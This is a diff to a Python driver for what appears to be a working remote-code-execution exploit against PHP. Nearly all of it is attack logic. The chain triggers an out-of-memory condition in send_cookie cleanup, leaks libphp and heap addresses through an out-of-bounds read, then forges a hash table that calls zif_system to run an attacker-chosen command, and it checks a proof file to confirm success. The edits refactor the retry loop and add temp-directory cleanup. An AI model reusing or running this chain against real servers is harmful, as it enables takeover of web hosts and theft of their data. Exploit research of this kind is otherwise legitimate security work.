@@ -31,6 +31,7 @@ from __future__ import annotations
 
 import argparse
 import os
+import shutil
 import socket
 import struct
 import subprocess
@@ -87,7 +88,7 @@ def send_plain(host: str, port: int, path: str, body: bytes, timeout: float = 12
     s.settimeout(timeout)
     try:
         s.sendall(req + body)
-        while len(out) < 4 << 20:
+        while len(out) < 8 << 20:
             chunk = s.recv(65536)
             if not chunk:
                 break
@@ -205,8 +206,8 @@ def main() -> int:
     if os.path.exists(args.proof):
         try:
             os.remove(args.proof)
-        except PermissionError:
-            subprocess.run(["sudo", "rm", "-f", args.proof], check=False)
+        except OSError:
+            pass
 
     if args.restart:
         subprocess.run(args.docker.split() + ["restart", args.restart],
@@ -228,82 +229,96 @@ def run_chain(args, holders, profile) -> int:
     for attempt in range(1, args.retries + 1):
         tmp = tempfile.mkdtemp(prefix="p2s-pure-")
         try:
-            s = socket.create_connection((args.host, args.port), timeout=5)
-            s.sendall(b"GET /index.php HTTP/1.0\r\nHost: x\r\n\r\n")
-            s.recv(1024)
-            s.close()
-        except OSError:
-            pass
-
-        print("[try %d] A1: END-cleanup send_cookie OOM" % attempt)
-        a1 = os.path.join(tmp, "a.bin")
-        subprocess.run([sys.executable, os.path.join(PURE, "mk_a1.py"),
-                        "--out", a1, "--big", "78"], check=True,
-                       stdout=subprocess.DEVNULL)
-        send_chunked(args.host, args.port, "/index.php" + Q, a1, 180)
-        time.sleep(0.2)
-
-        print("[try %d] B1: stale-id OOB read (chunk base + libphp)" % attempt)
-        b1 = os.path.join(tmp, "b1.bin")
-        subprocess.run([sys.executable, os.path.join(PURE, "mk_leak_b.py"),
-                        "--out", b1, "--spec", LEAK_SPEC,
-                        "--fake-len", "0xC8000", "--tag"], check=True,
-                       stdout=subprocess.DEVNULL)
-        leak_file = os.path.join(tmp, "leak.resp")
-        try:
-            resp = send_chunked(args.host, args.port, "/index.php", b1, args.timeout, leak_file)
-            info = parse_leak(resp, profile)
-        except Exception as exc:
-            print("      leak failed: %r" % (exc,))
+            return _run_attempt(args, holders, profile, attempt, tmp)
+        except _AttemptFailed:
             continue
-        print("      arch=%s decoded=%d zval_ptr_dtor=%#x -> libphp=%#x" % (
-            info["arch"], info["decoded"], info["zdtor"], info["lib"]))
-        print("      chunk buckets: %s" % [(hex(b), c) for b, c in
-                                           info["buckets"].most_common(6)])
-        if not info["main_candidates"]:
-            print("      no main-chunk candidate")
-            continue
-        main = info["main_candidates"][0]
-        delta = info["lib"] - main
-        prof = info["profile"]
-        if not (prof["delta_min"] <= delta <= prof["delta_max"]):
-            print("      implausible libphp-main delta %#x; re-leak" % delta)
-            continue
-
-        zif = info["lib"] + prof["zif_offset"]
-        for cand in info["main_candidates"]:
-            S = cand + 0xF8398
-            print("[try %d] A2 + B2: main=%#x S=%#x zif_system=%#x" % (
-                attempt, cand, S, zif))
-            subprocess.run([sys.executable, os.path.join(PURE, "cheap_oom_a.py"),
-                            "--host", args.host,
-                            "--port", str(args.port), "--parts", "880",
-                            "--depth", "64", "--fillers", "115"], check=True,
-                           stdout=subprocess.DEVNULL)
-            time.sleep(0.2)
-            ht = os.path.join(tmp, "ht.bin")
-            subprocess.run([sys.executable, os.path.join(PURE, "mk_ht.py"),
-                            hex(S), hex(zif), args.cmd, ht], check=True,
-                           stdout=subprocess.DEVNULL)
-            subprocess.run([sys.executable, os.path.join(PURE, "fake_ref_b.py"),
-                            "--host", args.host,
-                            "--port", str(args.port), "--vl", "384",
-                            "--n1", "500", "--n2", "495", "--rc", "1",
-                            "--ht-addr", hex(S), "--ht-file", ht], check=True,
-                           stdout=subprocess.DEVNULL)
-            time.sleep(0.6)
-            if os.path.exists(args.proof):
-                try:
-                    proof = open(args.proof).read().strip()
-                except PermissionError:
-                    proof = subprocess.run(["sudo", "cat", args.proof],
-                                           capture_output=True, text=True).stdout.strip()
-                print("[4/4] RCE OK; proof %s:" % args.proof)
-                print(proof)
-                return 0
-            print("      candidate failed (no proof)")
+        finally:
+            shutil.rmtree(tmp, ignore_errors=True)
     print("[4/4] all attempts failed")
     return 1
+
+
+class _AttemptFailed(Exception):
+    pass
+
+
+def _run_attempt(args, holders, profile, attempt, tmp) -> int:
+    try:
+        s = socket.create_connection((args.host, args.port), timeout=5)
+        s.sendall(b"GET /index.php HTTP/1.0\r\nHost: x\r\n\r\n")
+        s.recv(1024)
+        s.close()
+    except OSError:
+        pass
+
+    print("[try %d] A1: END-cleanup send_cookie OOM" % attempt)
+    a1 = os.path.join(tmp, "a.bin")
+    subprocess.run([sys.executable, os.path.join(PURE, "mk_a1.py"),
+                    "--out", a1, "--big", "78"], check=True,
+                   stdout=subprocess.DEVNULL)
+    send_chunked(args.host, args.port, "/index.php" + Q, a1, 180)
+    time.sleep(0.2)
+
+    print("[try %d] B1: stale-id OOB read (chunk base + libphp)" % attempt)
+    b1 = os.path.join(tmp, "b1.bin")
+    subprocess.run([sys.executable, os.path.join(PURE, "mk_leak_b.py"),
+                    "--out", b1, "--spec", LEAK_SPEC,
+                    "--fake-len", "0xC8000", "--tag"], check=True,
+                   stdout=subprocess.DEVNULL)
+    leak_file = os.path.join(tmp, "leak.resp")
+    try:
+        resp = send_chunked(args.host, args.port, "/index.php", b1, args.timeout, leak_file)
+        info = parse_leak(resp, profile)
+    except Exception as exc:
+        print("      leak failed: %r" % (exc,))
+        raise _AttemptFailed()
+    print("      arch=%s decoded=%d zval_ptr_dtor=%#x -> libphp=%#x" % (
+        info["arch"], info["decoded"], info["zdtor"], info["lib"]))
+    print("      chunk buckets: %s" % [(hex(b), c) for b, c in
+                                       info["buckets"].most_common(6)])
+    if not info["main_candidates"]:
+        print("      no main-chunk candidate")
+        raise _AttemptFailed()
+    main = info["main_candidates"][0]
+    delta = info["lib"] - main
+    prof = info["profile"]
+    if not (prof["delta_min"] <= delta <= prof["delta_max"]):
+        print("      implausible libphp-main delta %#x; re-leak" % delta)
+        raise _AttemptFailed()
+
+    zif = info["lib"] + prof["zif_offset"]
+    for cand in info["main_candidates"]:
+        S = cand + 0xF8398
+        print("[try %d] A2 + B2: main=%#x S=%#x zif_system=%#x" % (
+            attempt, cand, S, zif))
+        subprocess.run([sys.executable, os.path.join(PURE, "cheap_oom_a.py"),
+                        "--host", args.host,
+                        "--port", str(args.port), "--parts", "880",
+                        "--depth", "64", "--fillers", "115"], check=True,
+                       stdout=subprocess.DEVNULL)
+        time.sleep(0.2)
+        ht = os.path.join(tmp, "ht.bin")
+        subprocess.run([sys.executable, os.path.join(PURE, "mk_ht.py"),
+                        hex(S), hex(zif), args.cmd, ht], check=True,
+                       stdout=subprocess.DEVNULL)
+        subprocess.run([sys.executable, os.path.join(PURE, "fake_ref_b.py"),
+                        "--host", args.host,
+                        "--port", str(args.port), "--vl", "384",
+                        "--n1", "500", "--n2", "495", "--rc", "1",
+                        "--ht-addr", hex(S), "--ht-file", ht], check=True,
+                       stdout=subprocess.DEVNULL)
+        time.sleep(0.6)
+        if os.path.exists(args.proof):
+            try:
+                proof = open(args.proof).read().strip()
+            except PermissionError:
+                proof = subprocess.run(["sudo", "cat", args.proof],
+                                       capture_output=True, text=True).stdout.strip()
+            print("[4/4] RCE OK; proof %s:" % args.proof)
+            print(proof)
+            return 0
+        print("      candidate failed (no proof)")
+    raise _AttemptFailed()
 
 
 if __name__ == "__main__":
